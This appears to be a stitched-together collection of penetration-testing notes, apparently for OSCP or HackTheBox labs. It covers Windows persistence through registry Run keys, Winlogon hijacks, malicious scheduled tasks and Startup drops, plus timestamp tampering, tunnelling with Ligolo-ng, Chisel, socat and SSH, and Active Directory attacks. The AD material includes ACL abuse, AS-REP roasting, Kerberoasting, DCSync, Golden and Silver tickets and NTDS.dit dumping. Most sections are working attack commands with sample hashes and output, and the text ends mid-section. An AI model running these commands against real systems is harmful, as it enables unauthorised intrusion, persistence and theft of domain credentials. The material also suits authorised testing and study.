HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell

docs.title: Adding a Malicious Payload to Registry
docs.text:
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "C:\Users\Public\backdoor.exe" /f
  • This command ensures backdoor.exe will execute every time the user logs in.

docs.title: Hiding a Malicious Executable in Registry
docs.text:
reg add "HKCU\Software\Classes\mscfile\shell\open\command" /t REG_SZ /d "C:\Users\Public\reverse_shell.exe" /f
  • This will execute reverse_shell.exe when an .msc file is opened.

docs.title: Modifying Userinit for Persistent Backdoor
docs.text:
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /t REG_SZ /d "C:\Windows\System32\userinit.exe, C:\backdoor.exe" /f
  • Runs backdoor.exe at every login.

docs.title: Modifying Shell for Persistent Access
docs.text:
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /t REG_SZ /d "explorer.exe, C:\malicious.exe" /f
  • Executes malicious.exe alongside explorer.exe on user login.

docs.title: Scheduled Task Manipulation for Persistence
docs.text: Windows Task Scheduler can be used to create persistence by running malicious scripts or binaries at scheduled intervals.

docs.title: Creating a Malicious Scheduled Task
docs.text:
schtasks /create /tn "WindowsUpdate" /tr "C:\Users\Public\backdoor.exe" /sc ONLOGON /ru SYSTEM
  • Runs backdoor.exe every time the system starts.

docs.title: Listing Existing Scheduled Tasks
docs.text:
schtasks /query /fo LIST /v
  • Shows detailed task information, including hidden scheduled tasks.

docs.title: Modifying an Existing Scheduled Task for Persistence
docs.text:
schtasks /change /tn "BackupTask" /tr "C:\Users\Public\reverse_shell.exe"
  • Replaces an existing task’s executable with a malicious one.

docs.title: Deleting a Suspicious Scheduled Task
docs.text:
schtasks /delete /tn "WindowsUpdate" /f
  • Removes the scheduled persistence task.

docs.title: Abusing At for Scheduled Execution
docs.text:
at 15:30 /interactive C:\Users\Public\malware.exe
  • Executes malware.exe at 3:30 PM interactively.

docs.title: Startup Folder Persistence
docs.text: Another way to establish persistence is by dropping a malicious executable or script in the Startup folder, which executes on every reboot.

docs.title: Finding Startup Folder Paths
docs.text: echo %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup

docs.title: Dropping a Payload in the Startup Folder
docs.text:
copy backdoor.exe %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\
  • Runs backdoor.exe when the user logs in.

docs.title: Defensive Evasion - Modifying TimeStamps
docs.text: After modifying persistence mechanisms, an attacker can use timestamp manipulation to evade detection.

docs.title: Changing File Creation & Modification Timestamps
docs.text:
powershell -c "$(Get-Item C:\Users\Public\malware.exe).LastWriteTime=('01/01/2021 12:00:00 PM')"
  • Modifies the last modified timestamp to blend with legitimate system files.

docs.title: References
docs.text:
• LOLBAS Project
  • Windows Privilege Escalation Guide
  • Microsoft Docs: Task Scheduler

Tip

Registry Run keys (HKCU\Software\Microsoft\Windows\CurrentVersion\Run) persist across reboots and are user-writable without admin. For admin persistence, scheduled tasks with SYSTEM privileges are more reliable than services.

docs.title: Registry-Based Persistence
docs.text: Windows registry keys can be modified to execute a payload every time the system starts or a user logs in.

docs.title: Identifying Auto-Execution Registry Keys
docs.text:
The following registry keys can be leveraged for persistence:

reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce

If any of these paths are writable, a malicious binary can be inserted for execution.

docs.title: Creating a Registry Key for Persistence
docs.text:
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v MyBackdoor /t REG_SZ /d "C:\Users\Public\backdoor.exe" /f

This command ensures backdoor.exe will execute upon user login.

docs.title: Scheduled Task-Based Persistence
docs.text: Scheduled tasks can be abused to execute a malicious payload at specific times or system events.

docs.title: Enumerating Scheduled Tasks
docs.text:
To list all scheduled tasks:

schtasks /query /fo LIST /v

Look for tasks running as privileged users or those pointing to writable paths.

docs.title: Creating a Malicious Scheduled Task
docs.text:
A non-privileged user can create a task that executes a payload every minute:

schtasks /create /sc minute /mo 1 /tn "UpdateCheck" /tr "C:\Users\Public\malicious.exe" /F

This will execute malicious.exe every minute.

docs.title: Modifying an Existing Scheduled Task
docs.text:
If a scheduled task is writable, replace its target binary:

icacls C:\Path\To\TaskBinary.exe /grant Everyone:F
copy malicious.exe C:\Path\To\TaskBinary.exe

Once the task executes, the malicious binary will run.

docs.title: Triggering a Scheduled Task for Immediate Execution
docs.text:
schtasks /run /tn "UpdateCheck"

This manually triggers the task without waiting for the next scheduled interval.

docs.title: References
docs.text:
• Ligolo-ng GitHub

  • Chisel GitHub

  • System Weakness: Pivoting with Ligolo-ng & Chisel

Tool Best for Agent required on target Ligolo-ng Full network pivot with routing table Yes (agent binary) Chisel Single port forward, quick setup Yes (chisel binary) SSH -L / -R When SSH is available No socat Simple one-shot relay Yes (socat binary) sshuttle Full VPN over SSH from attacker machine No (attacker-side only)

Tip

Ligolo-ng is the fastest way to pivot to an internal network — once the agent connects back, add a route on your attacker machine and the entire subnet is accessible. No need for individual port forwards.

docs.title: 1. Download & Extract Ligolo-ng Binaries
docs.text:
Download binaries for both attacker (Kali VM) and target (Windows/Linux host) from Ligolo-ng Releases.

tar -xzvf ligolo-ng_agent_VERSION_HARDWARE.tar.gz  
tar -xzvf ligolo-ng_proxy_VERSION_HARDWARE.tar.gz

docs.title: 2. Configure Ligolo-ng Network
docs.text:
Create a TUN interface and bring it up:

sudo ip tuntap add user kali mode tun ligolo
sudo ip link set ligolo up

docs.title: 3. Start the Proxy on Kali
docs.text:
Run the proxy to listen for incoming agent connections:

./proxy -laddr 0.0.0.0:9001 -selfcert

docs.title: 4. Start the Agent on the Compromised Target
docs.text:
Upload the agent binary to the target and execute it:

.\agent.exe -connect 192.168.45.249:9001 -ignore-cert

docs.title: 5. Establish the Tunnel
docs.text:
Once the agent connects, Ligolo-ng will display:

INFO[0061] Agent joined.

Select the session:

ligolo-ng >> session

(Optional) Verify internal subnet visibility:

ligolo-ng >> ifconfig

Start the session:

ligolo-ng >> start

docs.title: 6. Add Route to Internal Network
docs.text:
Now, route internal traffic through the tunnel:

sudo ip route add 172.16.4.0/24 dev ligolo

This allows access to internal hosts behind the compromised target.

docs.title: Adding Listeners
docs.text:
Once Ligolo-ng is configured on the attacking machine and target, you may need to configure a listener to reach the attacking machine from internal PCs. 

listener_add --addr 0.0.0.0:443 --to 127.0.0.1:443

docs.title: Example Scenario
docs.text:
MS01: 192.168.149.150 MS02: 10.10.110.45 DC01: 10.10.110.44

You've deployed Ligolo-ng onto MS01 (agent) and are running the proxy from your kali VM. After you've gained initial access to MS01, you notice an MSSQL server on an nmap scan for MS02. You can connect to the MSSQL server from the kali VM, however, to execute shell code, you must use MS01 as your connecting IP, not the tun0 address in kali VM. To do this, setup a listener on the port you choose for the shell code which will allow you to catch the shell using netcat from kali.

docs.title: Chisel
docs.text: Chisel is a fast TCP/UDP tunnel that supports SOCKS5 proxying and reverse port forwarding, making it useful for pivoting in restricted environments.

docs.title: 1. Download & Extract Chisel
docs.text:
Download the latest release from Chisel Releases.

Extract the binary:

gunzip chisel_linux_amd64.gz
chmod +x chisel_linux_amd64

docs.title: 2. Start Chisel Server on Kali
docs.text:
Run the Chisel server in reverse mode:

chisel server -p 8080 --reverse

docs.title: 3. Start Chisel Client on the Target
docs.text:
Upload the chisel client to the compromised host and establish a reverse tunnel:

.\chisel.exe client 192.168.45.249:8080 R:3306:127.0.0.1:3306

This forwards MySQL port 3306 from the internal target to Kali.

docs.title: 4. Access the Forwarded Service
docs.text:
On Kali, connect to the internal MySQL service:

mysql -h 127.0.0.1 -P 3306 -u root -p

docs.title: Chisel SOCKS5 Proxying
docs.text:
To use Chisel as a SOCKS proxy, start the client with -socks5:

.\chisel.exe client 192.168.45.249:8080 R:socks

Configure proxychains:

socks5 127.0.0.1 1080

Run network enumeration through the tunnel:

proxychains nmap -sT -p445 10.4.50.215
proxychains smbclient -L //10.4.50.215/ -U user

This routes all traffic through the compromised host.

docs.title: Summary
docs.text:
• Ligolo-ng is ideal for full network tunneling with encrypted mutual TLS.

  • Chisel is lightweight and supports SOCKS proxying, dynamic port forwarding, and reverse tunnels.

  • Both tools enable attackers to bypass firewalls, pivot through networks, and access restricted services.

These tunneling techniques are crucial for maintaining persistence, lateral movement, and internal network access.

docs.title: References
docs.text:
• Socat: Linux Port Redirection

  • SSH Tunneling: Practical Examples

  • NAT Traversal Techniques

Tip

SSH local port forward: ssh -L 8080:internal-host:80 pivot@target — makes internal-host:80 accessible at localhost:8080 on your machine. Remote forward: ssh -R 4444:localhost:4444 pivot@target — routes target's port back to you.

docs.title: Port Forwarding with Socat
docs.text: Socat is a flexible command-line utility for bidirectional data transfer. It can be used to create simple or complex port forwarding scenarios.

docs.title: Scenario: Forwarding SSH Access Through an Internal Host
docs.text:
1. Compromise CONFLUENCE01 (a host with access to an internal network).

  2. Use Socat to forward traffic from the attacker to an internal PGDATABASE01 host.

docs.title: On the Compromised Machine (CONFLUENCE01)
docs.text:
socat TCP-LISTEN:2222,fork TCP:10.4.189.215:22

  • TCP-LISTEN:2222 → Listens for connections on port 2222.

  • fork → Allows multiple connections.

  • TCP:10.4.189.215:22 → Forwards traffic to the internal host on port 22 (SSH).

docs.title: On the Attacker’s Machine (Kali)
docs.text:
ssh database_admin@192.168.189.63 -p2222

  • Connects to CONFLUENCE01 on port 2222.

  • Traffic is forwarded to PGDATABASE01's SSH service.

docs.title: Port Forwarding with SSH
docs.text: SSH port forwarding (also known as SSH tunneling) is a secure way to forward network traffic.

docs.title: Local Port Forwarding
docs.text:
Forwards a local port to a remote destination through an SSH connection.

ssh -L 8080:10.4.50.215:80 user@192.168.1.100

  • -L 8080:10.4.50.215:80 → Forwards local port 8080 to the internal web server (port 80).

  • user@192.168.1.100 → SSH authentication to an intermediate host.

Now, the attacker can access http://localhost:8080/ to interact with the internal server.

docs.title: Using SSH for Dynamic Port Forwarding
docs.text: Dynamic port forwarding creates a SOCKS proxy that allows the attacker to route traffic through an intermediate host.

docs.title: Setting Up a SOCKS Proxy
docs.text:
ssh -D 1080 user@192.168.1.100

  • -D 1080 → Creates a SOCKS5 proxy on port 1080.

  • Traffic is relayed through the SSH tunnel.

docs.title: Using ProxyChains with the SOCKS Proxy
docs.text:
Modify /etc/proxychains4.conf:

socks5 127.0.0.1 1080

Now, tools like nmap and smbclient can be routed through the compromised host:

proxychains nmap -sT -p445 10.4.50.215
proxychains smbclient -L //10.4.50.215/ -U user

This allows access to internal network services.

docs.title: References
docs.text:
• BloodHound: Active Directory Attack Mapping

  • PowerView: ACL Enumeration

  • Mimikatz: Windows Privilege Escalation

  • HackTricks: Windows ACL Abuse

Tip

BloodHound highlights ACL abuse paths (WriteDACL, GenericAll, GenericWrite, ForceChangePassword). Use PowerView to enumerate and exploit: Add-DomainObjectAcl, Set-DomainUserPassword, etc.

docs.title: Understanding ACL Abuse in Active Directory
docs.text:
Access Control Lists (ACLs) define permissions on AD objects such as users, groups, and computers. Misconfigurations in ACLs can allow privilege escalation by granting excessive rights to unprivileged users.

Key permissions that can be exploited:

  • GenericAll – Full control over the object

  • GenericWrite – Modify attributes of the object

  • WriteOwner – Change ownership of the object

  • WriteDACL – Modify the ACL of the object

  • AllExtendedRights – Perform privileged operations (e.g., resetting passwords)

docs.title: Enumerating ACLs Using PowerView
docs.text:
Get-ObjectAcl -DistinguishedName "CN=Domain Admins,CN=Users,DC=corp,DC=com" -ResolveGUIDs | Format-Table SecurityIdentifier,ActiveDirectoryRights

This checks ACLs applied to the Domain Admins group and lists security identifiers (SIDs) with permissions.

docs.title: Converting SIDs to Usernames
docs.text:
If a SID appears with GenericAll or WriteDACL, convert it to a username:

Convert-SidToName S-1-5-21-1987370270-658905905-1781884369-1104

This helps identify accounts that can modify privileged objects.

docs.title: Exploiting GenericAll for Privilege Escalation
docs.text: If a low-privileged user has GenericAll on a privileged account, they can reset the password.

docs.title: Resetting Password for Privileged Account
docs.text:
1. Identify the vulnerable user (e.g., backupadmin has GenericAll on admin).

  2. Change the password:

    Set-DomainUserPassword -Identity admin -NewPassword (ConvertTo-SecureString "NewPass123!" -AsPlainText -Force)

  3. Log in with the new credentials:

    net use \\dc01 /user:corp\admin NewPass123!

Now, the user has escalated privileges to the target account.

docs.title: Exploiting WriteDACL for Privilege Escalation
docs.text: If a user has WriteDACL on a privileged object, they can modify permissions to grant themselves full control.

docs.title: Granting GenericAll to an Account
docs.text:
Add-ObjectAcl -TargetIdentity "Domain Admins" -PrincipalIdentity "user1" -Rights GenericAll

Now, user1 has full control over the Domain Admins group and can add themselves as a member.

docs.title: Adding User to Domain Admins
docs.text:
Add-DomainGroupMember -Identity "Domain Admins" -Members user1

This grants domain admin privileges.

docs.title: Exploiting WriteOwner for Privilege Escalation
docs.text: Users with WriteOwner can take ownership of an object and modify its permissions.

docs.title: Taking Ownership of a Privileged Account
docs.text: Set-DomainObjectOwner -Identity "admin" -OwnerIdentity "user1"

docs.title: Granting Full Control
docs.text:
Add-ObjectAcl -TargetIdentity "admin" -PrincipalIdentity "user1" -Rights GenericAll

Now, user1 has full control over admin and can reset its password.

docs.title: DCSync Attack via Replicating Directory Changes
docs.text: If an account has Replicating Directory Changes on the domain root, it can extract password hashes using Mimikatz.

docs.title: Checking for DCSync Privileges
docs.text: Get-ObjectAcl -DistinguishedName "DC=corp,DC=com" -ResolveGUIDs | ? {($_.ActiveDirectoryRights -match "Replicating")}

docs.title: Extracting Hashes
docs.text:
mimikatz # lsadump::dcsync /domain:corp.com /user:Administrator

If successful, this retrieves NTLM hashes for domain users, allowing pass-the-hash attacks.

docs.title: AS-REP Roasting
docs.text:
Tip

Always check for AS-REP roastable accounts early — it requires no credentials. impacket-GetNPUsers <domain>/ -dc-ip <dc> -request enumerates from Linux with no auth if null sessions work.

From the lab

AS-REP roasting often finds accounts misconfigured during provisioning scripts. Check service accounts and CI/CD runner accounts first — pre-auth is commonly disabled for convenience.

docs.title: Preconditions
docs.text:
• The user account must have:

    • The "Do not require Kerberos preauthentication" flag set

  • You must have:

    • A valid username (from enum or wordlist)

    • Access to UDP/TCP 88 on the domain controller

docs.title: Option A: PowerView (Post-Access)
docs.text:
Get-DomainUser -PreauthNotRequired

Returns users with the DONT_REQ_PREAUTH flag set (value 0x00400000).

docs.title: Option B: BloodHound Query
docs.text: MATCH (u:User) WHERE u.dontreqpreauth=true RETURN u.name

docs.title: Syntax
docs.text:
python3 GetNPUsers.py <domain>/ -usersfile <file> -dc-ip <ip> -request

You do not need a password if you're doing an unauthenticated attack.

Example (Unauthenticated):

python3 GetNPUsers.py htb.local/ -usersfile users.txt -dc-ip 10.10.110.146 -format hashcat -outputfile asrep.hash

Example (Authenticated):

python3 GetNPUsers.py htb.local/user:Password1 -dc-ip 10.10.110.146 -request

Output:

$krb5asrep$23$bob@HTB.LOCAL:0c9c8a...  <-- hash format for cracking

docs.title: Hashcat (mode 18200)
docs.text: hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt --force

docs.title: John the Ripper
docs.text: john --wordlist=/usr/share/wordlists/rockyou.txt --format=krb5asrep asrep.hash

docs.title: Step 4: Reuse Cracked Credentials
docs.text:
Once cracked, use the password with:

nxc smb <target> -u bob -p 'Summer2022!' -d htb.local --shares

Or WinRM:

nxc winrm <target> -u bob -p 'Summer2022!' -d htb.local --exec "whoami"

docs.title: Summary: AS-REP Roasting Workflow
docs.text: Phase Tool/Command Identify roastable Get-DomainUser -PreauthNotRequired (PowerView) GetNPUsers.py (unauth or auth mode) Extract hashes GetNPUsers.py -request -format hashcat -outputfile asrep.hash Crack offline hashcat -m 18200 asrep.hash rockyou.txt Use creds nxc smb, nxc winrm, or ldapsearch with recovered password

docs.title: Notes
docs.text:
• AS-REP Roasting is often low-hanging fruit in CTFs and labs

  • Usernames can be gathered via:

    • kerbrute userenum

    • ldapsearch with valid creds

    • rpcclient RID cycling

  • The DONT_REQ_PREAUTH flag is rarely used in secure environments, but still shows up in real-world misconfigs

docs.title: References
docs.text:
• Impacket GetNPUsers.py

  • PowerView (Preauth flag)

  • Hashcat Example Hashes

docs.title: DCSync Attack
docs.text:
Tip

DCSync requires DS-Replication-Get-Changes and DS-Replication-Get-Changes-All rights — typically Domain Admins, Enterprise Admins, or explicitly delegated accounts. Use mimikatz lsadump::dcsync /user:krbtgt to dump the krbtgt hash for golden tickets.

Watch out

DCSync generates Event ID 4662 on the DC. On monitored environments, this will alert. Do it once, get what you need, stop.

docs.title: Requirements
docs.text:
To run a DCSync attack, the attacker must have one of the following privileges on the domain:

  • Domain Admin

  • Enterprise Admin

  • Any user or group with Replicating Directory Changes and Replicating Directory Changes All rights on the domain object

Tip: These permissions can be granted indirectly (e.g., via ACL misconfig or GenericAll on the domain object — BloodHound helps detect this).

docs.title: With PowerView (Post-Shell)
docs.text: Get-ObjectAcl -DistinguishedName "DC=corp,DC=local" -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match "Replicating" }

docs.title: With BloodHound
docs.text:
Use the built-in query:

Find all principals with DCSync rights

Graph shows all users/groups with replication permissions.

docs.title: Step 2: Run DCSync with Mimikatz
docs.text: Must be run as a user with the appropriate privileges.

docs.title: Dump krbtgt Hash
docs.text: lsadump::dcsync /domain:corp.local /user:krbtgt

docs.title: Dump Administrator Hash
docs.text: lsadump::dcsync /domain:corp.local /user:Administrator

docs.title: Dump All Users (Heavy Noise)
docs.text: lsadump::dcsync /domain:corp.local /all

docs.title: Dump Specific User in Another Domain (if trust exists)
docs.text: lsadump::dcsync /domain:child.corp.local /user:svc_sql

docs.title: Output Example
docs.text:
SAM Username : krbtgt
NTLM        : 1693c6cefafffc7af11ef34d1c788f47

Once you have the NTLM hash:

  • Use it for Golden Ticket attacks (krbtgt)

  • Use it for Pass-the-Hash (Administrator)

  • Crack it offline if needed

docs.title: With hashcat:
docs.text: hashcat -m 1000 krbtgt.hash rockyou.txt

docs.title: With john:
docs.text: john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt krbtgt.hash

docs.title: Practical Usage Flow (From Admin Shell)
docs.text:
privilege::debug
lsadump::dcsync /domain:corp.local /user:krbtgt
kerberos::golden /krbtgt:<hash> /domain:corp.local /sid:S-1-5-21-xxx... /user:admin /ptt

This results in forged Domain Admin access via Golden Ticket.

docs.title: Summary: DCSync
docs.text: Task Tool/Command Check replication rights Get-ObjectAcl or BloodHound Dump krbtgt hash lsadump::dcsync /user:krbtgt Dump admin hash lsadump::dcsync /user:Administrator Dump all users lsadump::dcsync /all Use hash For Golden Ticket or Pass-the-Hash attacks Crack offline (optional) hashcat -m 1000, john --format=NT

docs.title: Notes
docs.text:
• DCSync does not interact with LSASS — it's stealthier in memory, but very noisy in logs

  • If you find GenericAll or GenericWrite on the domain object, escalate to DCSync rights

  • Works even across trusted domains if rights exist

  • Golden Ticket requires the krbtgt hash from DCSync

docs.text:

  • BloodHound: Visualizing Active Directory

Tip

BloodHound + SharpHound is the fastest way to map AD attack paths. Import the ZIP and immediately check "Shortest Paths to Domain Admins" — most HTB AD boxes have a 2-3 hop path obvious in the graph.

From the lab

BloodHound is the fastest way to find privesc paths in AD but requires data collection first. Run SharpHound on a domain-joined machine and import the ZIP. Look for "Shortest Path to Domain Admins" immediately — most HTB AD boxes have a 2-3 hop path that's obvious in the graph.

docs.title: Enumerating Domain Users and Groups
docs.text: Identifying users and groups within Active Directory helps determine high-value targets.

docs.title: Listing All Domain Users
docs.text: net user /domain

docs.title: Inspecting a Specific User
docs.text: net user <username> /domain

docs.title: Listing All Domain Groups
docs.text: net group /domain

docs.title: Inspecting Members of a Specific Group
docs.text:
net group "Domain Admins" /domain

These commands help identify privileged accounts, potential targets, and misconfigurations.

docs.title: Enumerating Service Principal Names (SPNs)
docs.text: SPNs are unique identifiers that map services to specific accounts. They are commonly used in Kerberoasting attacks.

docs.title: Listing SPNs for All Users
docs.text:
Get-NetUser -SPN | select samaccountname,serviceprincipalname

Example output:

samaccountname serviceprincipalname
-------------- --------------------
krbtgt         kadmin/changepw
iis_service    {HTTP/web04.corp.com, HTTP/web04, HTTP/web04.corp.com:80}

This helps identify service accounts that may have high privileges.

docs.title: Enumerating Active Directory Permissions and ACLs
Understanding ACLs
docs.text:
Each AD object has an Access Control List (ACL) that contains Access Control Entries (ACEs). These define whether access to an object is allowed or denied.

Key permissions:

GenericAll: Full permissions on object
GenericWrite: Edit certain attributes
WriteOwner: Change ownership
WriteDACL: Modify object permissions
AllExtendedRights: Change password, reset password, etc.
ForceChangePassword: Change another user’s password
Self: Add oneself to a group

docs.title: Enumerating ACLs for a User
docs.text:
Get-ObjectAcl -Identity <username>

Example:

Get-ObjectAcl -Identity "stephanie"

This returns the ACEs applied to the user.

docs.title: Converting SIDs to Names
docs.text:
Convert-SidToName S-1-5-21-1987370270-658905905-1781884369-1104

Example output:

CORP\stephanie

This helps correlate raw security identifiers (SIDs) to actual usernames.

docs.title: Enumerating Domain Admins
docs.text:
Get-NetGroup "Domain Admins" | select member

Example output:

member
------
CN=jen,CN=Users,DC=corp,DC=com

If a non-admin account appears in a privileged group, it may indicate a misconfiguration.

docs.title: Enumerating Object Permissions for Privilege Escalation
docs.text: Identifying misconfigured ACLs can help escalate privileges within AD.

docs.title: Finding Users with GenericAll Permissions
docs.text:
Get-ObjectAcl -Identity "Management Department" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights

Example output:

SecurityIdentifier                            ActiveDirectoryRights
------------------                            ---------------------
S-1-5-21-1987370270-658905905-1781884369-512  GenericAll
S-1-5-21-1987370270-658905905-1781884369-1104 GenericAll

Converting SIDs reveals:

PS C:\Tools> Convert-SidToName S-1-5-21-1987370270-658905905-1781884369-1104
CORP\stephanie

If stephanie has GenericAll, it indicates full control over the object, which can be leveraged for privilege escalation.

docs.title: Kerberoasting
docs.text:
Tool When to use Rubeus.exe kerberoast On a domain-joined Windows machine with a shell impacket-GetUserSPNs From Linux with valid domain credentials nxc ldap with --kerberoasting When you want CrackMapExec/NetExec format output

Tip

Target high-privilege service accounts first (those in Domain Admins, IT groups, etc.). Use BloodHound to identify which SPN accounts have paths to DA before cracking all hashes blindly.

docs.title: Pre-Access: SPN Enumeration with Valid Creds
docs.text: These steps assume you have domain user credentials but no shell.

docs.title: Tool: Impacket GetUserSPNs.py
docs.text:
python3 GetUserSPNs.py <domain>/<user>:<pass> -dc-ip <DC_IP>

Example:

python3 GetUserSPNs.py oscp.exam/web_svc:Diamond1 -dc-ip 10.10.110.146

Output:

ServicePrincipalName    Name        PasswordLastSet     LastLogon
----------------------  ----------  ------------------- ------------
MSSQLSvc/sql01.htb.local:1433  svc_sql      2023-01-10 14:12:00   ...

$krb5tgs$23$*svc_sql@HTB.EXAMPLE:...

The $krb5tgs$... line is the TGS ticket, crackable offline with hashcat or john.

Use -request to actively request the ticket and dump it in hashcat format:

python3 GetUserSPNs.py htb.example/web_svc:Password1 -dc-ip 10.10.110.146 -request

use hashcat -m 13100 for this hash typ.

docs.title: Post-Access: SPN Enumeration from a Shell
docs.text: You’ve landed a shell on a domain-joined machine using SMB/WinRM. Now enumerate SPNs and extract tickets.

docs.title: Option A: PowerView (PowerShell)
docs.text:
Import-Module .\PowerView.ps1
Get-NetUser -SPN | Select-Object samaccountname,serviceprincipalname

docs.title: Option B: Rubeus (C# / OPSEC-friendly)
docs.text:
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast

Options:

  • Add /user:svc_sql to limit results

  • Use /format:hashcat for compatibility with hashcat

docs.title: Crack with Hashcat
docs.text: hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt --force

docs.title: Crack with John
docs.text: john --wordlist=/usr/share/wordlists/rockyou.txt --format=krb5tgs hashes.kerberoast

docs.title: Post-Crack: Reuse the Credentials
docs.text:
Cracked password (example):

svc_sql : Summer2023!

Use with NetExec for lateral movement:

nxc smb 10.10.110.150 -u svc_sql -p 'Summer2023!' -d htb.example --shares

Or test with WinRM:

nxc winrm 10.10.110.150 -u svc_sql -p 'Summer2023!' -d htb.example --exec "whoami"

docs.title: Summary: Kerberoasting Workflow
docs.text: Phase Tool Command Example Enumerate SPNs GetUserSPNs.py python3 GetUserSPNs.py htb.local/user:pass -dc-ip <ip> Extract Tickets GetUserSPNs.py -request Appends TGS ticket to output Rubeus kerberoast Dumps all roastable SPNs locally Crack Tickets hashcat hashcat -m 13100 hash.txt rockyou.txt john john --format=krb5tgs --wordlist=... hash.txt Reuse Creds NetExec / WinRM / RDP Use cracked creds to enumerate or laterally move

docs.title: Notes
docs.text:
• SPNs tied to user accounts are crackable; SPNs tied to machine accounts are not useful for Kerberoasting

  • Use BloodHound to identify high-priv accounts with SPNs

  • Kerberoasting can lead directly to local or domain admin access if service accounts are misconfigured

docs.text:

  • GhostPack Rubeus

  • PowerView

docs.text:

  • BloodHound: Active Directory Attack Mapping

Watch out

Golden tickets and shadow copies are high-noise persistence mechanisms. In a real engagement, document and demonstrate rather than leaving active backdoors — clean up after yourself.

docs.title: Golden Ticket Persistence
docs.text: Golden Tickets allow an attacker to persist indefinitely within an Active Directory environment by forging Ticket Granting Tickets (TGTs).

docs.title: Extracting the krbtgt Hash
docs.text:
The krbtgt account is the Kerberos service account used for encrypting TGTs. If compromised, attackers can generate their own TGTs.

  1. Obtain the krbtgt NTLM hash using Mimikatz:

    mimikatz # privilege::debug
mimikatz # lsadump::lsa /patch

    Example output:

    RID  : 000001f6 (502)
User : krbtgt
LM   :
NTLM : 1693c6cefafffc7af11ef34d1c788f47

    This NTLM hash will be used to forge a Golden Ticket.

docs.title: Crafting a Golden Ticket
docs.text:
With the extracted krbtgt hash, create a Golden Ticket:

mimikatz # kerberos::golden /user:jen /domain:corp.com /sid:S-1-5-21-1987370270-658905905-1781884369 /krbtgt:1693c6cefafffc7af11ef34d1c788f47 /ptt

This injects the forged ticket into memory, allowing persistent domain access.

docs.title: Verifying the Ticket
docs.text:
Confirm the Golden Ticket is active:

klist

Use the ticket to execute commands as a privileged user:

C:\Tools\SysinternalsSuite>.\PsExec.exe \\dc1 cmd.exe

If successful, the user gains administrative access to the domain controller.

docs.title: Shadow Copy Persistence
docs.text: Windows Volume Shadow Copy Service (VSS) allows attackers to extract Active Directory database files for offline credential dumping.

docs.title: Creating a Shadow Copy
docs.text:
1. Run the following on a compromised Domain Controller:

    C:\Tools>vshadow.exe -nw -p C:

    Example output:

    - Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2

  2. Copy the NTDS database from the shadow copy:

    C:\Tools>copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\ntds.dit.bak

  3. Extract the SYSTEM hive:

    C:\>reg.exe save hklm\system c:\system.bak

  4. Transfer the ntds.dit.bak and system.bak files to an attacker-controlled machine.

docs.title: Dumping Credentials from the Shadow Copy
docs.text:
On an attacker-controlled machine, use Impacket’s secretsdump.py to extract credentials:

impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL

This extracts NTLM hashes of all domain users, allowing for further attacks such as Pass-the-Hash (PtH).

docs.title: Silver & Golden Ticket Attacks (Kerberos Forgery)
docs.text:
Tip

Golden tickets require the krbtgt NTLM hash (get via DCSync or NTDS.dit dump). Silver tickets only require the service account hash — lower privilege to obtain but scoped to a single service. Use golden for persistence, silver for targeted lateral movement.

docs.title: Key Differences
docs.text: Feature Silver Ticket Golden Ticket Target A specific service on a host (e.g., CIFS, HTTP) Any service/domain-wide Key Required NTLM hash of a service account NTLM hash of the krbtgt account Ticket Forged TGS (Service ticket) TGT (Ticket Granting Ticket) DC Interaction No (offline, stealthier) Yes (trusted by DC) Scope of Access One service/host Full domain impersonation Detectability Lower (no DC comms) Higher (used across DCs)

docs.title: Description
docs.text: A Silver Ticket is a forged TGS ticket that allows the attacker to authenticate to a specific service (e.g., CIFS, HTTP) on a specific machine without contacting the Domain Controller.

docs.title: Requirements
docs.text:
• NTLM hash of the target service account

  • SPN and hostname of the target service

  • Domain SID and name

docs.title: How to Forge a Silver Ticket with Mimikatz
Step 1: Obtain the Service Account Hash
docs.text:
Can be retrieved via:

  • Dumping LSASS with Mimikatz / Rubeus / lsassy

  • Dumping from ntds.dit

  • DCSync

Example:

RC4/NTLM: 4d28cf5252d39971419580a51484ca09

docs.title: Step 2: Forge Ticket with Mimikatz
docs.text:
kerberos::golden /user:<username> /domain:<domain> /sid:<domain-sid> /target:<fqdn> /service:<service> /rc4:<hash> /ptt

Example:

mimikatz # kerberos::golden /user:jeffadmin /domain:corp.local /sid:S-1-5-21-1234... /target:web.corp.local /service:http /rc4:4d28cf... /ptt
  • /ptt: Pass-the-ticket (loads the ticket into memory)

docs.title: Step 3: Use the Ticket
docs.text:
Check ticket:

klist

Access the target service:

Invoke-WebRequest -UseDefaultCredentials http://web.corp.local

You can also use PsExec, RDP, SMB access depending on the forged service.

docs.title: Description
docs.text: A Golden Ticket is a forged TGT that allows an attacker to impersonate any user, including domain admins, and authenticate anywhere in the domain.

docs.title: Requirements
docs.text:
• NTLM hash of the krbtgt account

  • Domain SID and domain name

  • Username to impersonate (usually Administrator)

docs.title: Step 1: Dump krbtgt Hash
docs.text:
Via DCSync:

